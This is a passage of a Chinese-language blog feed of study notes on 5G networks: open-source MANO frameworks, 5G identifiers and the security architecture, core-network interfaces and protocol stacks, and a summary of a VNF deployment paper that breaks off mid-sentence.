<strong>OpenStack</strong>、<strong>Kubernetes</strong></p><ul><li><strong>OpenStack</strong>: 一個雲端計算平台，能夠控制大量異構(heterogeneous)資源，像是計算、儲存、網路資源等。在它的眾多功能之中，它可像是VIM一樣，管理網路基礎設施、虛擬機、容器、unikernel、VNF服務和應用</li><li><strong>Kubernetes</strong>: 提供自動化部屬、擴充、管理VM、容器、unikernel、和其應用；透過一系列的物件來抽象化和表達系統的狀態，這些持久性實體描述了在K8S管理的cluster上跑的VNF和應用程式、它們的可用資源以及有關其預期行為的策略。<br>  經過數年也有數個與k8s互動來處理協定層Layer2,Layer3複雜問題的專案，像是<strong>Istio</strong>、<strong>NSM(Network Service Mesh)</strong> 等<ul><li>Istio mesh service: 實作流量管理、策略執行、和遙測收集(telemetry collection)等任務</li><li>NSM:NSM透過Kubernetes API以支援進階使用案例並促進採用新的cloud native方案，並且它也能夠允許網路管理員執行無縫執行任務，像是請求網路介面、添加無線電服務等等</li></ul></li></ul><h2 id="The-Open-Network-Automation-Platform"><a href="#The-Open-Network-Automation-Platform" class="headerlink" title="The Open Network Automation Platform"></a>The Open Network Automation Platform</h2><p>主要是由Linux Foundation開發的一套NFV框架，有許多支援的營運商。<br>OAN被部屬在多個商業蜂窩網路之中，其廠商像是Ericsson,Nokia,Huawai,ZTE這些公司，他們提供ONAP支援並整合進他們的產品。</p><p>ONAP對於商業蜂窩網路中最讚的基於軟體的解決方式。<br>ONAP負責處理大量網路服務的設計、創造和生命週期管理</p><p>網路營運商可用ONAP編排部屬在他們網路中的PNF與VNF。除了NFV orchestrator共同擁有的功能(對於虛擬基礎設施或網路服務使用自動化且基於policy的管理)，ONAP還提供一個<strong>設計框架</strong>來模擬網路應用和服務，以一個<strong>資料分析框架</strong>來監控服務的修復和擴增</p><p>ONAP還提供了許多的參考設計(i.e. blueprint)，可用來為特定場景(5G Networks,VoLTE…etc)部屬部屬ONAP架構，</p><p><img src="https://i.imgur.com/gaDoMDa.png"></p><p>ONAP架構的主要components:</p><ul><li><strong>Management Framework:</strong> 又被稱為<strong>OOM</strong> (ONAP Operations Manager)，負責編排與監控ONAP組件的生命週期，OOM利用K8S和<strong>Consul</strong>來支援服務控制、發現、設定和分段。在它的功能中最值得注意的是<ul><li>Component deployment,dependency manager and configuration</li><li>real-time health monitoring</li><li>service clusteromg and scaling</li><li>component upgrade,restart and deletion</li></ul></li><li><strong>Design Framework</strong>: <ul><li>允許使用宣告式的<strong>模型語言</strong> 來建立網路服務，使得可以指定每個服務的要求和功能。</li><li>它允許通過一組通用規範和策略來對資源、服務、產品及其管理和控制功能進行<strong>建模</strong>。</li><li>它還包括用於系統資產、流程和策略的定義、模擬和認證的服務設計和創建模組。</li><li>模組也提供現有服務的資料庫和用於驗證網路功能的API</li></ul></li><li><strong>Run-time Framework</strong><ul><li>由許多軟體框架組成，用於大多數的管理與編排功能</li><li>當在run-time階段，Micorservices Bus允許由ONAP管理的不同網路功能(NF)之間的訊息與資料通訊及路由</li><li>run-time框架使用自動化的control loop來調度終止微服務，並從平台收集資料和分析資料</li><li>run-time component有公開API、dashboard和cmdline工具，透過一個統一的介面來控制網路基礎施設施</li></ul></li></ul><p>在這些框架底層可以用來與外部控制器、作業系統、雲端環境整合；nothboud API則提供給OSS&#x2F;BSS，大數據及相關服務。</p><h2 id="Integration-with-5G-networks"><a href="#Integration-with-5G-networks" class="headerlink" title="Integration with 5G networks"></a>Integration with 5G networks</h2><p>除了一般的行動網路編排與管理框架，ONAP提供了與5G部屬相關的重要功能<br>通常營運商的主要要求會是需支援hybrid infra</p><ul><li>須包含軟硬體設備</li><li>邊緣自動化，雲須分布在地理位置上不同的邊緣位置</li><li>real-time 分析(須使用自動化的control loop)</li></ul><p>The Frankfurt release (June 2020)與O-RAN整合</p><h2 id="Open-Source-NFV-Management-and-Orchestration"><a href="#Open-Source-NFV-Management-and-Orchestration" class="headerlink" title="Open Source NFV Management and Orchestration"></a>Open Source NFV Management and Orchestration</h2><p>Open Source NFV Management and Orchestration(OSM)是由一堆網路營運商開發的一個MANO框架。<br>與ONAP相似，也被開發及部屬在蜂窩網路之中。</p><p><img src="https://i.imgur.com/rPRGyRL.png"><br><em>OSM的架構圖</em></p><ul><li><strong>The information model</strong>:<br>  將為NF,切片建模為模板，稱為packages，這是由ETSI MANO框架所提供的定義明確的資訊模型來實現的。與ONAP的design components類似，它使電信營運商能夠分析網路需求，並對需要為功能、服務、切片部屬的資源進行建模。</li><li><strong>The OSM Automation Framework</strong>:<br>  它自動化了NF的生命週期，從初始化到擴增到刪除，而這由應用資訊模型到實際部屬的infra上<br>  ，來完成的(可看上圖)，透過自動化框架向不同建模組件公開northbound interface</li></ul><p>與ONAP一樣，OSM southbound norhtbound APIs可公開給外部服務，像是其他編排器和OSS&#x2F;BSS等</p><h1 id="Software-defined-radio-support-for-open-source-radio-units"><a href="#Software-defined-radio-support-for-open-source-radio-units" class="headerlink" title="Software-defined radio support for open source radio units"></a>Software-defined radio support for open source radio units</h1><p>SDR設備<br>USRP、BladeRF、LimeSDR、Iris</p><h1 id="Testbeds"><a href="#Testbeds" class="headerlink" title="Testbeds"></a>Testbeds</h1><p>介紹開源應用、框架、硬體元件用來實例化及軟體化5G網路的測試平台</p><p><img src="https://i.imgur.com/QvOZnqY.png"></p><h1 id="Softwarized-5G-Limitations-and-road-ahead"><a href="#Softwarized-5G-Limitations-and-road-ahead" class="headerlink" title="Softwarized 5G: Limitations and road ahead"></a>Softwarized 5G: Limitations and road ahead</h1><ul><li>Keep pace with the standards</li><li>Latency and scalability issues.</li><li>Limited contributions for RAN open source software</li></ul><div class="note info flat"><p>論文連結: <a href="https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf">https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf</a></p></div>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> O-RAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 核心網路-移動性管理(Mobile Management)</title>
      <link href="/posts/a05f1769.html"/>
      <url>/posts/a05f1769.html</url>
      
        <content type="html"><![CDATA[<h2 id="用戶標誌與位置標誌"><a href="#用戶標誌與位置標誌" class="headerlink" title="用戶標誌與位置標誌"></a>用戶標誌與位置標誌</h2><p>用戶標誌分為永久標誌與非永久標誌兩種:</p><ul><li><p><strong>永久標誌</strong><br>  一旦用戶綁定便不會修改，具備一定程度的隱私性</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SUPI</span><br><span class="line">2. 通用公共訂閱標誌(GPSI)</span><br><span class="line">3. 永久設備標誌(PEI)</span><br></pre></td></tr></table></figure></li><li><p><strong>非永久標誌</strong><br>  用於臨時標示用戶，3GPP會不定期更標示符號</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 5G 全球臨時統一標示符(5G-GUTI)</span><br><span class="line">2. SUCI</span><br></pre></td></tr></table></figure><p>位置標誌包含<strong>小區位置跟蹤標誌(TAI)<strong>、</strong>跟蹤區編碼(TAC)</strong></p></li></ul><h3 id="SUPI"><a href="#SUPI" class="headerlink" title="SUPI"></a>SUPI</h3><p>SUPI為永久標誌，5G系統中每個簽約的用戶都會被分配到一個5G SUPI，用於<strong>在3GPP系統中</strong>標示該簽約用戶<br>SUPI標誌存於<strong>UDM&#x2F;UDR(一種NF)</strong> 之中，功能類似4G的IMSI。<br>SUPI可包含IMSI訊息或是用於私有網路的特定網路標誌(network-specific identifier)</p><p>IMSI格式:</p><table><thead><tr><th>封包</th><th>MCC</th><th>MNC</th><th>MSIN</th></tr></thead><tbody><tr><td>長度</td><td>3bit</td><td>2~3bit</td><td>&lt;&#x3D;10bit</td></tr><tr><td></td><td>PLMN</td><td>PLMN</td><td></td></tr></tbody></table><ul><li>In 漫遊場景: SUPI需要攜帶所歸屬網路的地址資訊:MNC、MCC</li><li>若與 EPC Network互通: SUPI總是基於IMSI</li></ul><h3 id="通用公共訂閱標誌-GPSI"><a href="#通用公共訂閱標誌-GPSI" class="headerlink" title="通用公共訂閱標誌 (GPSI)"></a>通用公共訂閱標誌 (GPSI)</h3><p>GPSI為永久標誌，<strong>用於在非3GPP網路之中來標示一個3GPP的簽約</strong><br>GPSI與3GPP的對應關係會儲存在簽約資料中；GPSI在系統內部與外部都可作為公共標誌。<br>GPSI可以是<strong>MSISDN</strong>或其他外部標誌</p><h3 id="永久設備標誌-PEI"><a href="#永久設備標誌-PEI" class="headerlink" title="永久設備標誌(PEI)"></a>永久設備標誌(PEI)</h3><p>PEI為永久標誌，<strong>針對存取5G網路的3GPP UE的標誌</strong><br>不同類型的UE和不同使用場景，PEI可能會有不同格式<br>UE可在發送PEI的同時，攜帶對應 該PEI所使用格式的指令訊息<br>若UE支援至少一種3GPP存取技術，則UE的PEI系需使用IMEI或IMEISV格式</p><h3 id="5G-全球臨時統一標示符-5G-GUTI"><a href="#5G-全球臨時統一標示符-5G-GUTI" class="headerlink" title="5G 全球臨時統一標示符(5G-GUTI)"></a>5G 全球臨時統一標示符(5G-GUTI)</h3><p>5G-GUTI是一個非永久標誌，由AMF為UE臨時分配(於<strong>註冊流程</strong>時分配)的，用於標示該UE<br>使用不同存取方式(3GPP,non-3GPP)，使用相同的5G-GUTI</p><ul><li><p>5G-GUTI的結構:</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-GUTI&gt;:=&lt;GUAMI&gt;&lt;5G-TMSI&gt; (:= 為 &quot; 定義為 &quot; 的符號)</span><br><span class="line">&lt;GUAMI&gt;:用於標示一個或多個AMF</span><br><span class="line">&lt;5G-TMSI&gt;:用於識別唯一的UE</span><br></pre></td></tr></table></figure></li><li><p>GUAMI的結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;GUAMI&gt;:= &lt;MCC&gt;&lt;MNC&gt;&lt;AMF Region ID&gt;&lt;AMF Set ID&gt;&lt;AMF Pointer&gt;</span><br><span class="line"></span><br><span class="line">&lt;AMF Region ID&gt;: 用於標示區域</span><br><span class="line">&lt;AMF Set ID&gt;: 在AMF區域中唯一標示一組AMF</span><br><span class="line">&lt;AMF Pointer&gt;: 在AMF組中唯一標示一個AMF </span><br></pre></td></tr></table></figure></li><li><p>5G-S-TMSI是GUTI的縮短形式，用於無線signalling(尋呼或業務請求流程)提升傳輸效率</p></li><li><p>5G-S-IMSI-結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-S-TMSI&gt;:= &lt;AMF Set ID&gt;&lt;AMF Pointer&gt;&lt;5G-TMSI&gt;</span><br></pre></td></tr></table></figure></li><li><p>5G-TMSI的10位最低有效位元被NG-RAN用來決定UE的呼叫時機</p><ul><li>所以該10位最低有效位元應平均分布，使不同UE的尋呼時機均勻分布</li></ul></li></ul><table><thead><tr><th>MCC</th><th>MNC</th><th>AMF Region ID</th><th>AMF Set ID</th><th>AMF Pointer</th><th>5G-TMSI</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>16bit</td><td>4bit</td><td>4bit</td><td>32bit</td></tr><tr><td>PLMN</td><td>PLMN</td><td>AMF ID</td><td>AMF ID</td><td>AMF ID</td><td></td></tr><tr><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td></td></tr><tr><td></td><td></td><td></td><td>5G-S-TMSI</td><td>5G-S-TMSI</td><td>5G-S-TMSI</td></tr><tr><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td></tr></tbody></table><h3 id="SUCI"><a href="#SUCI" class="headerlink" title="SUCI"></a>SUCI</h3><p>SUCI是非永久性標誌，基於 SUPI(Subscription Permanent Identifier) 加密形式構成用於保護隱私的標誌<br>由於每個簽約用戶的SUPI是永久且唯一的，直接傳輸會有隱私風險</p><p>UE(USIM或ME)可以根據<strong>ECIES</strong>,甚至是<strong>Null-Scheme</strong>生成SUCI<br>當AMF收到SUCI後，觸發授權(Authentication)流程，之後在UDM&#x2F;SIDF中使用解密演算法(SIDF)將收到的SUCI解碼成SUPI，以利完成後續授權工作</p><h3 id="TAI-amp-TAC"><a href="#TAI-amp-TAC" class="headerlink" title="TAI&amp;TAC"></a>TAI&amp;TAC</h3><p>皆為位置性標誌<br>TAI: 跟蹤區標誌<br>TAC: 跟蹤區編碼</p><ul><li>格式:<table><thead><tr><th>MCC</th><th>MNC</th><th>TAC</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>20bit</td></tr><tr><td>PLMN ID</td><td>PLMN ID</td><td>TAC</td></tr><tr><td><strong>TAI</strong></td><td><strong>TAI</strong></td><td><strong>TAI</strong></td></tr></tbody></table></li></ul><h2 id="安全架構與流程"><a href="#安全架構與流程" class="headerlink" title="安全架構與流程"></a>安全架構與流程</h2><p>UE在RAN或在不同網路間移動時，需要與網路進行相互認證，確保雙方是可信賴的<br>UE與網路之間的相互認證需要<strong>5G安全架構</strong>的支援<br>5G安全架構應包含:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 緩解和降低攻擊</span><br><span class="line">- 支援驗證和授權機制</span><br><span class="line">- 支持密鑰相關功能</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mY2DamY.png"></p><h2 id="安全架構特點"><a href="#安全架構特點" class="headerlink" title="安全架構特點"></a>安全架構特點</h2><ul><li>與存取方式(3GPP、non3GPP)無關的安全架構，使用統一的驗證方法與密鑰架構</li><li>增強安全(4G → IMSI → 不安全 | 5G → SUCI&#x2F;SUPI → 安全)</li><li>差異化認證: 5G支援USIM,憑證,帳密等多種認證方式</li><li>服務化架構和開放介面安全</li></ul><p>安全架構所涉及的NF，包含: ARPF,AUSF,SEAF,SIDF</p><ul><li>ARPF:<ul><li>與UDM一起部屬</li><li>負責儲存根密鑰 $Ki$ 和相關的簽約資料</li><li>計算5G授權向量</li></ul></li><li>AUSF:<ul><li>提供<strong>EAP認證伺服器</strong>的功能，進行EAP認證以推導出<strong>錨點密鑰</strong></li></ul></li><li>SEAF:<ul><li>與AMF一起部屬</li><li>負責根據錨點密鑰來推導出下層的NAS與AS密鑰，5G AKA 完成授權結果比較功能</li></ul></li><li>SIDF:<ul><li>與UDM一起部屬</li><li>負責將SUCI解碼成SUPI</li></ul></li></ul><h2 id="安全流程"><a href="#安全流程" class="headerlink" title="安全流程"></a>安全流程</h2><p><img src="https://i.imgur.com/GuQNm2p.png"></p><ul><li>由UE發起Request，發送SUCI或5G-GUTI訊息給SEAF</li><li>SEAF將SUCI或SUPI(若5G-GUTI有效)發送給來源網路(歸屬地網路)的AUSF</li><li>AUSF進行認證完後，將訊息發送給來源網路的 UDM</li><li>UDM收到SUCI，將其解碼為SUPI，並通過用戶資料，選擇相應的認證演算法，透過後續流程完成身分認證</li></ul><p>目前5G支援的認證演算法: <strong>EAP-AKA’</strong> 和 <strong>5G AKA</strong> -3GPP TS 33.501</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://cat.chriz.hk/2019/12/5g-security-architecture.html">https://cat.chriz.hk/2019/12/5g-security-architecture.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 網路功能介面與協定堆疊</title>
      <link href="/posts/3d68fc76.html"/>
      <url>/posts/3d68fc76.html</url>
      
        <content type="html"><![CDATA[<h2 id="N2介面-控制介面與協定堆疊"><a href="#N2介面-控制介面與協定堆疊" class="headerlink" title="N2介面(控制介面與協定堆疊)"></a>N2介面(控制介面與協定堆疊)</h2><p>$5G Access,Network \stackrel{N2}{\longleftrightarrow} 5GC(AMF)$</p><ul><li><strong>管理流程:</strong> 不與特定UE相關，像是設定或重置N2介面</li><li><strong>與單一UE相關的流程:</strong> NAS傳輸流程、UE上下文管理、PDU session資源相關流程、切換管理..etc</li><li>採用 <strong>NG-AP協定</strong> (不論是哪種Access Network: 3GPP RAN 或 N3IWF non-3GPP )，屬於一種應用層協定</li><li>AMF對於一個UE有唯一的N2 終結點</li><li>由於SMF與AMF是解耦的，所以NG-AP支援AMF在5G RAN與5GC之間傳遞<strong>N2 SM訊息</strong></li></ul><p><img src="https://i.imgur.com/TP3cmJb.png"></p><ul><li>SCTP保證Acces Network與5GC之間的傳輸</li></ul><h2 id="UE與5GC之間的控制面介面與協定堆疊"><a href="#UE與5GC之間的控制面介面與協定堆疊" class="headerlink" title="UE與5GC之間的控制面介面與協定堆疊"></a>UE與5GC之間的控制面介面與協定堆疊</h2><p>針對每種UE使用的連接方式(3GPP、non-3GPP)，UE皆會有一個 <strong>N1 NAS連接</strong>，且會有唯一的N1終結點為位於AMF。</p><blockquote><p><strong>非接入層(NAS, Non-access stratum)</strong><br>原先存在於 3G&#x2F;UMTS中的協定層，是用戶設備與核網之間的功能層<br>具備以下功能:</p><blockquote><p>移動性管理<br>呼叫控制<br>會話管理<br>身分管理<br><a href="https://hackmd.io/M4SyLAOpRam7lZVLuujOHw">NAS 參考資料</a></p></blockquote></blockquote><p>N1 NAS可用於:</p><ul><li><strong>UE註冊管理</strong></li><li><strong>連接管理</strong></li><li><strong>會話管理</strong></li></ul><p>N1介面之中的NAS協議分成: NAS-MM、NAS-SM</p><h2 id="NAS-MM"><a href="#NAS-MM" class="headerlink" title="NAS-MM"></a>NAS-MM</h2><p>用於UE與AMF以外的NF進行互動</p><ul><li>會話管理消息</li><li>UE 策略</li><li>位置服務</li></ul><p><em>NAS傳輸會話管理訊息、短訊、UE策略、位置服務等協議流程</em><br><img src="https://i.imgur.com/iPUTyxa.gif"></p><h3 id="特點"><a href="#特點" class="headerlink" title="特點"></a>特點</h3><p>處理UE與AMF之間的NAS流程，包含:</p><ul><li>處理UE的註冊管理(RM)和連接管理(CM): 在UE與AMF之間提供安全的訊息連結 、存取控制</li><li>適用於其他類型的NAS訊息(NAS-SM、SMS等)，可與RM&#x2F;CM NAS 訊息同時傳輸</li><li>針對不同存取方式(3GPP, non-3GPP)也都採用相同的NAS協定</li><li>UE針對不同種存取方式都會有一個N1 NAS連接</li></ul><p><img src="https://i.imgur.com/sdjzoKJ.gif"></p><h2 id="NAS-SM"><a href="#NAS-SM" class="headerlink" title="NAS-SM"></a>NAS-SM</h2><p>支援處理UE與SMF之間的<strong>會話管理</strong></p><ul><li>PDU會話用戶面的建立、修改、釋放</li><li>SM訊息的建立、處理都是在NAS-SM之中完成的（內容不會被AMF解析）</li><li>NAS-MM層會負責UE-AMF之間SM訊息的收發，並提供安全保護(<strong>保護訊息的完整性</strong>)</li></ul><p><img src="https://i.imgur.com/qLGM1Hk.gif"></p><h2 id="5GC-NF之間的控制面介面與協定堆疊"><a href="#5GC-NF之間的控制面介面與協定堆疊" class="headerlink" title="5GC NF之間的控制面介面與協定堆疊"></a>5GC NF之間的控制面介面與協定堆疊</h2><p>5G 核網中的NF，<strong>NF Service Producer</strong> 會透過服務化界面為 <strong>NF Service Consumer</strong> 提供服務</p><p>5G核網中將以下控制介面定義為服務化界面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Nsmf</span><br><span class="line">- Nudm</span><br><span class="line">- Nnrf</span><br><span class="line">- Nnssf</span><br><span class="line">- Nausf</span><br><span class="line">- Nnef</span><br><span class="line">- Nsmsf</span><br><span class="line">- Nudr</span><br><span class="line">- Npcf</span><br><span class="line">- N5g-eir</span><br><span class="line">- Nlmf</span><br></pre></td></tr></table></figure><p>這些服務化介面以<strong>HTTP 2.0</strong>與<strong>JSON</strong>作為應用層協定；3GPP所有網路功能都必須支持<strong>TLS</strong><br>若PLMN沒有提供其他網路安全方案，則TLS就必須被使用<br>而未來可能會以 <strong><a href="https://zh.wikipedia.org/wiki/QUIC">QUIC&#x2F;UDP</a></strong> 作為優化的方案</p><p><img src="https://i.imgur.com/QWxhGJN.png"></p><h2 id="N4介面與協定堆疊"><a href="#N4介面與協定堆疊" class="headerlink" title="N4介面與協定堆疊"></a>N4介面與協定堆疊</h2><p>$SMF\stackrel{N4}{\longleftrightarrow}UPF$</p><p>N4介於SMF與UPF之間，具備控制面與用戶面功能<br>N4定義了以下流程:</p><p><em>控制面流程</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- N4會話管理:</span><br><span class="line">用於SMF建立、更新、刪除UPF上的N4會話上下文(Session Context)</span><br><span class="line">- N4報告流程:</span><br><span class="line">用於UPF向SMF事件(EX.流量使用情況)</span><br><span class="line">- N4節點級別流程:</span><br><span class="line">SMF、UPF之間N4節點的建立、更新、連結、釋放；UPF會向SMF報告N4節點級別的事件</span><br><span class="line">- SMF暫停計費流程:</span><br></pre></td></tr></table></figure><p><em>用戶面流程</em><br>在SMF、UPF之間轉發流量:<br>當用戶處於<strong>CM-IDLE</strong>狀態時，UPF可轉發downlink 資料給SMF，SMF再決定呼叫策略</p><table><thead><tr><th>PFCP</th><th>$\longleftrightarrow$</th><th>PFCP</th></tr></thead><tbody><tr><td>UDF</td><td>$\longleftrightarrow$</td><td>UPF</td></tr><tr><td>IP</td><td>$\longleftrightarrow$</td><td>IP</td></tr><tr><td>L2</td><td>$\longleftrightarrow$</td><td>L2</td></tr><tr><td>L1</td><td>$\longleftrightarrow$</td><td>L1</td></tr><tr><td>Control Plane $\longleftrightarrow$ User Plane</td><td></td><td></td></tr></tbody></table><h2 id="用戶面介面與其協定堆疊"><a href="#用戶面介面與其協定堆疊" class="headerlink" title="用戶面介面與其協定堆疊"></a>用戶面介面與其協定堆疊</h2><p>$Access,Network\stackrel{N3}{\longleftrightarrow}UPF$<br>$UPF \stackrel{N9}{\longleftrightarrow}UPF$<br>N3與N9介面分別在5G RAN 與 UPF之間 以及UPF與UPF之間傳遞數據</p><p><img src="https://i.imgur.com/p8GoGVl.gif"></p><ul><li><strong><a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%8D%95%E5%85%83">PDU(Protcol Data Unit) 層</a></strong>: 負責在UE與Data Network之間的PDU Session傳遞PDU</li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNF Deployment and Flow Scheduling in Geo-distributed Data Centers</title>
      <link href="/posts/85fe9be3.html"/>
      <url>/posts/85fe9be3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>NFV可降低網路營運上的設備採購以及維護成本，透過NFV可將網路功能與物理基礎設施進行解耦合。<br>並在通用硬體上運行虛擬網路功能(VNF)，NFV可使網路更加靈活可控，但仍然存在各種技術挑戰<br>像是如何在不同地理位置上有效部屬VNFs，以及在不同地理位址的資料中心調度網路流量。</p><p>本篇論文中研究此議題並最大縣動減少部屬以及通訊成本，此問題被轉換成 混合整數線性規劃問題(mixed-integer linear programming)，本論文提出一種基於放鬆的演算法(relaxtion-based algorithm)來解決它的計算複雜度，最後通過實驗結果表明，該演算法可有效降低部屬與通訊成本。</p><h2 id="Ch1-Introduction"><a href="#Ch1-Introduction" class="headerlink" title="Ch1-Introduction"></a>Ch1-Introduction</h2><p>傳統資料中心或雲端運算網路架構仰賴特定硬體來提供特定網路服務，像是防火牆、入侵偵測系統。<br>這些造成硬體成本過高。而NFV的出現取代了這種往賴特定硬體的網路架構。</p><p>藉由NFV，網路功能可能被虛擬化成基於軟體的VNF並運行在一般COTS服器上。<br><img src="https://i.imgur.com/9GcTBYs.png"></p><p>而為了提供網路服務，網路流需要流經過一連串以排序之網路功能的集合<br><img src="https://i.imgur.com/fBK2DgN.png"></p><p>然而要實際應用NFV技術，必須考量到VNF要如何串接成一串服務鏈(service chains)以降低成本<br>以往這部分的研究都僅僅關注於部屬成本，旨在減少資料中心的資源消耗，像是CPU、記憶體、儲存空間等，或是單獨著重於通訊成本，像是最大限度減少點對點的延遲等<br>但幾乎沒有考量到若作為VNF部屬的通訊成本。</p><p>在服務鏈上每個鏈結上的網路功能都是有序的，每個鏈結也都有自己的流速，同時在不同VNF部屬在地域分布的資料中心的不同VNF，將導致不同的通訊成本。這代表部屬成本與通訊成本之間的關係不疼夠被忽視，此外舊有研究也很少考慮NFV服務中的流量平衡問題，以前的研究通常會假設VNF流不能夠被分配到同一類的多個VNF Instance上，或是其分散式流量率(distributed flow rate)是預先定義好的，這對於大規模網路中的私有NFV服務來說是不限實也沒效率的，本篇論文認為VNF instance的數量和相應的網路流量應該根據當前網路狀態進行調整。</p><p>本篇論文，考量到有序服務鏈在不同地理分布資料中心下的部屬成本以及通訊成本間的權衡問題，並且我們允許一種 NF 具有多個 VNF 實例。</p><p>本文主要貢獻：</p><ul><li>本文將綜合考量網絡拓撲、VNF的數量和部署以及流量調度，來將VNF部屬以及流量調度問題轉換為混和整數線性規劃問題(mixed integer linear programming, MILP)，，以降低部署成本和通訊成本。</li><li>在該MILP方程式的基礎上設計一種低複雜度的 基於鬆弛的演算法，並進行大量實驗來說明此演算法相較現有演算法的優勢，結果表明本研究提出的演算法可有效降低部屬成本以及通訊成本。</li></ul><h2 id="Ch2-System-Model"><a href="#Ch2-System-Model" class="headerlink" title="Ch2-System Model"></a>Ch2-System Model</h2><h3 id="A-DCs-Topology"><a href="#A-DCs-Topology" class="headerlink" title="A. DCs Topology"></a>A. DCs Topology</h3><p>由於資料中心分布在世界各地，不同資料中心間所傳輸的網路流量會有著不同的成本(cost)<br>這裡透過無向圖(indirected graph) 來代表資料中心的網路拓圖 $G_{d}&#x3D;(D,E_{d})$<br>$D$ 為資料中心  $E_{d}$ 代表網路邊緣<br>$H_{dp}$ 為 edge $e_{dp} \in E_{d}$的 權重(weight) 其中 $d,p \in D$<br>(上面就代表，D和P是資料中心，而H是DP這之間網路連接的Weight，所代表的是這兩資料中心之間的傳輸成本)<br>而這裡須注意，個別資料中心自己到自己之間沒有傳輸成本 $H_{dd}&#x3D;0$</p><h3 id="B-Chain-Set"><a href="#B-Chain-Set" class="headerlink" title="B. Chain Set"></a>B. Chain Set</h3><p>有一組鏈 $C&#x3D;{c1,c2,…}$ 被部屬到資料中心，若將服務鏈中$c_{i} \in C$來源節點(source)與目的節點(destination)分別以 $o_{i}$ 以及 $t_{i}$ 表示。<br>每個服務鏈 $c_{i}$中都有一組以排序之網路功能 $c_{i}&#x3D;{s_{i,1},s_{i,2},….s_{i,j},…}$ 來以速率 $R_{i}$處理網路流量<br>我們定義 $|c_{i}|$ 為服務鏈 $c_{i}$的長度，並且定義 $n(s_{i,j})$ 來表示𝑠𝑖,𝑗的網絡功能的類型<br>舉例來說如圖<br><img src="https://i.imgur.com/y39ct1S.png"><br>圖中三個服務鏈的長度分別為2,3,3 (注意:，不同的服務鏈可能需要一種網絡功能)<br>舉例來說，$c1$ $c2$ $c3$ 可能都共同包含網路功能 $f1$，即 $n(s_{1,1})&#x3D;n(s_{2,2})&#x3D;n(s_{3,2})&#x3D;f_{1}$</p><h3 id="C-NFs-Graph"><a href="#C-NFs-Graph" class="headerlink" title="C. NFs Graph"></a>C. NFs Graph</h3><p>基於上述的鏈集合(Chain Set)，我們可以建構網路功能圖 $G_{n}$<br>此網路功能圖為有向非循環圖(directed acyclic graph, DAG)<br>$G_{n}&#x3D;(V_{n},E_{n})$，且$V_{n}$ 可被歸納為三個種類:</p><ul><li>sources $O$</li><li>network function $N$</li><li>destinations $T$<br>而每個edge $e_{m,n} \in E_{n}$ 代表網路功能$m$與$n$之間的網路流量<br>對於鏈 $c_{i}$ 中的每個服務對(service pair) $(s_{i,j},s_{i,j+1})$，在$G_{n}$中存在一個網路功能對(network function pair)<br>$(m,n)$，存在從$m$到$n$的有向鏈結，其中 $n(s_{i,j})&#x3D;m$ , $n(s_{i,j+1})&#x3D;n$</li></ul><p>如同剛剛提及，不同網路功能可能會由不同服務鏈以不同的網量速率來共享功能<br>對於每個edge $e_{m,n} \in E_{n}$，我們定義一個集合 $U_{m,n} &#x3D; { i : c_{i} \in C, n(s_{i,j})&#x3D;m,n(s_{i,j+1})&#x3D;n}$ 來記錄具有網路功能對($m$,$n$)的服務鏈</p><p>存在具有不同流量要求的不同網路流量在edge $e_{m,n}$ 上傳輸，表示為 $R_{i}$, $\forall i \in 